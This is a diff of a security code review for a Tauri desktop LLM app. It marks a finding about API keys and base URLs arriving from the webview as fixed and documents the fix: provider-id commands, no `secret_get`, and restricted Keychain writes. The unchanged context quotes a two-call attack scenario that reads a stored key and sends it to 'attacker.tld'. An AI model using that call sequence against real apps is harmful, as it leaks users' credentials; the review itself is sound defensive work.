@@ -9,7 +9,7 @@ Read-only review of the 47 commits on `main` not yet on `origin/main` (234 files
 | # | Severity | Category | Location | Issue |
 |---|---|---|---|---|
 | 1 | Critical | Security | `src-tauri/capabilities/default.json:13` | `sql:allow-execute` bypasses the SQL guard — **fixed, see below** |
-| 2 | High | Security | `src-tauri/src/commands/llm.rs:385` | API key and base URL come from the webview |
+| 2 | High | Security | `src-tauri/src/commands/llm.rs:385` | API key and base URL come from the webview — **fixed, see below** |
 | 3 | High | Correctness | `src-tauri/src/commands/llm.rs:308` | UTF-8 characters split across chunks are corrupted |
 | 4 | Medium | Correctness | `src-tauri/src/commands/llm.rs:288` | Stop does nothing while the provider is silent |
 | 5 | Medium | Correctness | `src/llm/tools.ts:288` | Divide-by-zero guard checks the wrong variable |
@@ -65,6 +65,28 @@ SECURITY.md already lists the `secret_get` round trip as a known limit. The new 
 **Scenario:** `invoke('secret_get', {account: 'provider:1'})`, then `invoke('list_models', {baseUrl: 'https://attacker.tld', apiKey: k})`. The OpenAI or Gemini key goes out in a Bearer header.
 
 **Fix:** commands take a `provider_id`, and Rust reads `base_url` from SQLite and the key from the Keychain. Remove `secret_get` from the IPC surface, or limit it to a "key exists" check.
+
+**Status: done (2026-11-01, 0.4.0).** `secret_get` is gone; the webview has no
+way to read a stored secret.
+
+- **`chat_completion(providerId, model?, messages, tools, onEvent)`** — Rust reads
+  the provider row (`base_url`, `model`, `keychain_ref`) and the Keychain entry,
+  then makes the request. The URL and key never cross IPC, so a renderer cannot
+  point a stored key at another host.
+- **`provider_models(providerId)`** and **`provider_connection(providerId)`** —
+  the same, for the provider list's "test" action and the model picker.
+- **`probe_models(baseUrl, apiKey)`** and **`probe_connection(baseUrl, apiKey)`**
+  remain for the provider form, which must test an endpoint before it is saved.
+  That key is typed into the form by the user; no stored key is reachable
+  through them.
+- **`secret_set` / `secret_delete`** now accept only `provider:<id>` accounts, so
+  a compromised renderer cannot overwrite or delete other items in the app's
+  Keychain service (unit-tested).
+
+`getProviderKey` and `service.providerApiKey` were deleted from the TypeScript
+side; the transport carries a provider id instead of an endpoint. SECURITY.md's
+secrets and open-issues sections were updated — the "keys pass through JS" entry
+is closed.
 
 ### 8. Medium — Assistant links can navigate the app window
 
